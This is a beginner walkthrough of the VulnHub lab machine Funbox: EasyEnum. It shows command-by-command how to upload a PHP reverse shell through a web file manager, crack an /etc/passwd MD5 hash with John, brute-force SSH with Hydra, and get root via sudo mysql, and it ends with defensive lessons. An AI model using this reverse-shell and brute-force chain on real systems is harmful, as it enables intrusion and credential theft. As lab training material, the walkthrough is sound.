# Funbox: EasyEnum — VulnHub Walkthrough (Beginner Friendly)

> Also known as **Funbox 7**. The author (0815R2d2) calls it *"Boot2root in 6
> steps for script-kiddies"* with a timeframe of *"20 mins to never ever"*. The
> name is the lesson: **enumerate carefully and reduce the user list** before you
> brute force. Every step is explained.

| Field | Value |
| --- | --- |
| **Machine** | Funbox: EasyEnum |
| **Difficulty** | Easy |
| **Author** | 0815R2d2 |
| **Released** | 19 September 2020 |
| **VulnHub Entry** | https://vulnhub.com/entry/funbox-easyenum,565/ |
| **Download** | https://vulnhub.com/entry/funbox-easyenum,565/#download |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu 18.04) |

> **The author's hints** (from the VulnHub description) map to each step below:
> 1. *Use "Daisys best friend" for information gathering.*
> 2. *Visit "Karla at home".*
> 3. *John and Hydra loves only rockyou.txt.*
> 4. *Enum/reduce the users to brute force — or brute force the rest of your life.*

---

## 0. What you will learn

- How to discover a host and enumerate a **web server** for hidden paths.
- How a **PHP file manager** ("mini shell") becomes remote code execution.
- How to read `/etc/passwd` for a **crackable password hash** and crack it with
  **John the Ripper** and `rockyou.txt`.
- How secrets left in a web config (`config-db.php`) give you more credentials.
- Why **reducing the user list** before a `hydra` brute force matters.
- How a `sudo`-allowed program becomes root via **GTFOBins**.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). Kali running, OVA imported, both VMs on
the same host-only network.

---

## 1. Reconnaissance — finding the target

> **Goal:** confirm the target's IP address on your isolated lab network.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH   (Kali)
192.168.56.101  08:00:27:11:22:33   PCS Systemtechnik GmbH   (target)
```

**Target IP:** `192.168.56.101`

![arp-scan finding the target](images/01-recon.png)

---

## 2. Enumeration — open ports and services

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

> **How to read it:** only two services. SSH is usually the *end* of the chain,
> so the web server on `:80` is our way in. Browsing to it shows the **Apache2
> Ubuntu Default Page** — another sign that the real content is hidden.

### 2.1 Directory enumeration

```bash
gobuster dir -u http://192.168.56.101/ \
  -w /usr/share/wordlists/dirb/common.txt -t 40 -x php,txt
```

```text
/robots.txt           (Status: 200)
/javascript           (Status: 301)
/phpmyadmin           (Status: 301)
/mini.php             (Status: 200)
```

> **Why it works:** content-discovery tools try thousands of common names. Three
> results stand out: `phpmyadmin` (a database UI), and **`mini.php`** — a file
> manager / uploader.

```bash
curl http://192.168.56.101/robots.txt
```

```text
# often points at a path worth visiting, e.g. an admin or info page
```

![nmap and gobuster output](images/02-enum.png)

---

## 3. Foothold — gaining the first shell

### 3.1 The vulnerability: a web file manager that runs PHP

`http://192.168.56.101/mini.php` is a **mini file manager** with an **upload**
feature. As with any upload that lands inside the web root, we can drop a PHP
reverse shell and get it executed.

Grab a reverse shell:

```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
# edit the IP/port at the top to 192.168.56.10 / 4444
```

```bash
# On Kali: start a listener
nc -lvnp 4444
```

Use `mini.php` to upload `php-reverse-shell.php`, then request it:

```bash
curl http://192.168.56.101/php-reverse-shell.php
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 51234
www-data@funbox:/var/www/html$
```

We now have a shell as `www-data`. Upgrade it to a full TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, then on Kali: stty raw -echo; fg
```

![mini.php upload to reverse shell](images/03-foothold.png)

### 3.2 The user flag

```bash
find / -name "*flag*" 2>/dev/null
cat /home/<user>/local.txt 2>/dev/null
```

```text
# the "user" flag; path/name varies by build
```

---

## 4. Privilege escalation — becoming root

### 4.1 Enumerate users (hint 4: "reduce the users")

```bash
cat /etc/passwd
ls -la /home
```

```text
# human accounts on this box include: goat, harry, karla, oracle, sally
```

> **Why it matters:** the box wants you to *reduce* the candidate list, not run a
> blind brute force against every account. Now we hunt for credentials.

### 4.2 Crack `oracle`'s hash with John (hint 3)

Look closely — `oracle` has a password hash stored directly in `/etc/passwd`:

```text
oracle:$1$O@GOeN$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash
```

Save the hash and crack it with **John the Ripper** and `rockyou.txt`:

```bash
echo 'oracle:$1$O@GOeN$PGb9VNu29e9s6dMNJKH/R0' > oracle.hash
john --wordlist=/usr/share/wordlists/rockyou.txt oracle.hash
```

```text
Loaded 1 password hash (md5crypt, ...)
hiphop           (oracle)
```

> **Why it works:** `$1$` means **MD5-crypt**. It is fast to compute and a common
> dictionary word (`hiphop`) appears in `rockyou.txt`. *(The exact hash/password
> varies by build.)*

```bash
# verify the credentials
ssh oracle@192.168.56.101        # password: hiphop
```

### 4.3 A second credential source: `config-db.php` (hint 1)

While poking at the web app, read phpMyAdmin's configuration file:

```bash
cat /var/www/html/phpmyadmin/config-db.php
```

```text
$dbuser='phpmyadmin';
$dbpass='tgbzhnujm';
```

> **Why it works:** web apps routinely store database credentials in plaintext
> config files readable by the web user. These often get **reused** for OS
> accounts.

### 4.4 Brute force the reduced user list with Hydra (hints 2 & 3)

Now that we have a short user list, brute-force SSH with `hydra` and `rockyou`:

```bash
printf 'goat\nharry\nkarla\noracle\nsally\n' > users.txt
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101
```

```text
[22][ssh] host: 192.168.56.101   login: goat   password: <found>
```

> **Why it works:** matching a *small* user list against one wordlist is fast and
> targeted. (It is common to find that a password from `config-db.php` or from
> the `oracle` crack is reused for another account — `karla`'s home, per hint 2,
> is the other lead here.)

```bash
ssh goat@192.168.56.101
```

### 4.5 `sudo` a program that can run a shell — GTFOBins

```bash
sudo -l
```

```text
User goat may run the following commands on funbox:
    (root) NOPASSWD: /usr/bin/mysql
```

> **How to read it:** `goat` may run **`mysql` as root** without a password.
> MySQL's interactive shell can execute OS commands, so this *is* root.

```bash
sudo mysql -e '\! /bin/bash'
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** `\!` runs a shell from inside the `mysql` client, and because
> `sudo` launched `mysql` as `root`, the shell is `root`. This pattern is
> documented on [GTFOBins](https://gtfobins.github.io/gtfobins/mysql/#sudo).

### The root flag

```bash
cat /root/proof.txt
```

```text
# the root flag; name/path varies by build
```

![sudo mysql to root](images/04-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Web file manager allows PHP upload | `mini.php` | Remote Code Execution as `www-data` |
| 2 | Password hash readable in `/etc/passwd` | `oracle` account | Account compromise (cracked with John) |
| 3 | DB credentials in plaintext config | `phpmyadmin/config-db.php` | Credential disclosure / reuse |
| 4 | Weak, guessable, reused passwords | SSH accounts | Brute-force / lateral movement |
| 5 | `sudo` allows a shell-capable program | `sudo mysql` | Privilege escalation to `root` |

## 6. Defensive lessons (blue team)

- **Don't put file uploads in the web root.** Any file that can be uploaded and
  then executed is remote code execution. Store uploads outside the web root and
  forbid script execution in upload directories.
- **Use shadowed passwords only.** Password hashes must live in `/etc/shadow`
  (root-only), never in world-readable `/etc/passwd`.
- **Never store secrets in web-readable files.** Database creds belong in
  environment variables or a secrets manager, not `config-db.php`.
- **Enforce strong, unique passwords.** Dictionary words like `hiphop` fall in
  seconds; reuse turns one disclosure into many.
- **Restrict `sudo`.** Grant the minimum commands, and never `NOPASSWD` a program
  (like `mysql`, `vi`, `python`) that can spawn a shell.
- **Rate-limit and lock out SSH.** Brute force only works because repeated
  failures are free; use `fail2ban`, key auth, and MFA.
- **Detection:** alert on web-uploaded files being executed, on `/etc/passwd`
  reads by web users, and on SSH auth-failure bursts.

---

## 7. References

- VulnHub entry: https://vulnhub.com/entry/funbox-easyenum,565/
- GTFOBins — mysql (`sudo`): https://gtfobins.github.io/gtfobins/mysql/#sudo
- John the Ripper: https://www.openwall.com/john/
- php-reverse-shell (pentestmonkey):
  https://github.com/pentestmonkey/php-reverse-shell
- Community writeups consulted:
  - [Funbox: EasyEnum — Nate's CTF Writeups](https://nobodynate.github.io/OSCP-Prep/VulnHub/Funbox%20EasyEnum/)
  - [FunboxEasyEnum — OffSec Proving Grounds Play (optimusprime7)](https://medium.com/@optimusprime7/funboxeasyenum-walkthrough-offsec-proving-grounds-play-f2ebc2ff9088)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with `arp-scan`
- [ ] `images/02-enum.png` — gobuster finding `mini.php` and `phpmyadmin`
- [ ] `images/03-foothold.png` — uploading the reverse shell via `mini.php`
- [ ] `images/04-root-flag.png` — `sudo mysql` to root, then `cat /root/proof.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
